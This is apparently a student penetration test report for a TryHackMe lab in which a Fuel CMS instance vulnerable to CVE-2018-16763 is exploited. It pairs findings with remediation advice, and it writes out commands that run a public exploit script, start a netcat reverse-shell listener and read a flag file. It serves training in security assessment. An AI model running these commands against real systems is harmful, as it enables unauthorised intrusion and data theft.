# Penetration Test Report  
**Engagement:** TryHackMe - Vulnerability Capstone  
**Date:** September 2025  
**Tester:** Colin S  

---

## Summary 
A penetration test was conducted against the TryHackMe Vulnerability Capstone environment to assess the security of the deployed Fuel CMS instance. The assessment discovered that the application discloses its product/version publicly, which allowed mapping to a publicly available remote code execution exploit, successfully deploying a web shell and establishing a reverse shell to access sensitive files.  

To reduce risk, patch the application to a non-vulnerable version, remove any web shells, harden upload handling, apply least-privilege to web processes, and implement network/host monitoring to detect web shell activity and suspicious outbound connections.

 
## Vulnerabilities  

### 1. Application & Version Disclosure
**CVSS v4.0 Base Score:** 6.9 (Medium)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  

**Summary:** The web application exposed product version information on public pages, facilitating targeted exploitation.  

**Background:** The provided web application contained detailed product and version information available publicly. Exposing such detail publicly enables attackers to quickly map to known CVEs and exploits, reducing the time-to-exploit (TTE).  

**Technical details & Evidence:** Navigated to the target web application via ```http://10.201.35.36```  
![Question 1 and 2.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Vulnerability_Capstone/Images/Question%201%20and%202.png)  
Detailed product and version information was quickly located.  

Upon undertaking online research, it was discovered that this product version was vulnerable to CVE-2018-16763.

**Impact:** This disclosure allowed rapid identification of a publicly documented pre-authentication remote code execution vulnerability, directly increasing the likelihood of successful system compromise and a reduction in the TTE.  

**Remediation Advice:** Remove product/version disclosures from public pages and HTTP headers. Maintain an internal inventory of web apps and enforce prompt patching/upgrades. Use automated scanners to detect exposed version strings and flag them for remediation.

### 2. Remote Code Execution (Fuel CMS)
**CVSS v4.0 Base Score:** 9.3 (Critical)  
CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N  

**Summary:** Exposed product and version information enabled identification and exploitation of a publicly available remote code execution vulnerability, resulting in full system compromise.    

**Background:** The Fuel CMS version discovered is vulnerable to CVE-2018-16763. A publicly available remote code execution exploit was discovered and used to gain full system control. Running applications with known critical CVEs enables attackers to rapidly locate and execute exploits on target systems. This can lead to data exfiltration, lateral movement across the network, and installation of backdoors for future use. 

**Technical details & Evidence:**  A publicly available exploit for the identified Fuel CMS version was located (see Appendices).  

Target was exploited as follows
```bash
python3 fuelcms_rce.py 10.201.35.36
```
![Question 5 initial.png](https://github.com/Schenkee/TryHackMe-Guides/blob/main/Vulnerability_Capstone/Images/Question%205%20initial.png)  

```bash
nc -lnvp 9001
```

```console

10.4.12.97:9001
```

```bash

cat flag.txt
```

**Impact:** Remote attackers can obtain interactive shell access, read sensitive files, escalate privileges, establish persistence, and pivot to other hosts â€” leading to full host compromise and potentially broader network compromise. Data exfiltration can result in significant reputational damage and may expose the organisation to legal or regulatory consequences.  

**Remediation Advice:** Apply vendor fixes or upgrade Fuel CMS to a non-vulnerable release immediately, perform file-integrity scans to remove any malicious artifacts and rotate potentially exposed credentials, harden upload handling through strict server-side validation and non-executable upload directories, implement network controls such as WAF filtering and monitoring of abnormal outbound connections, restrict administrative interface access by IP, harden the host with least-privilege webserver accounts and extend detection by adding SIEM/EDR rules to identify web shell indicators and reverse-shell style connections.
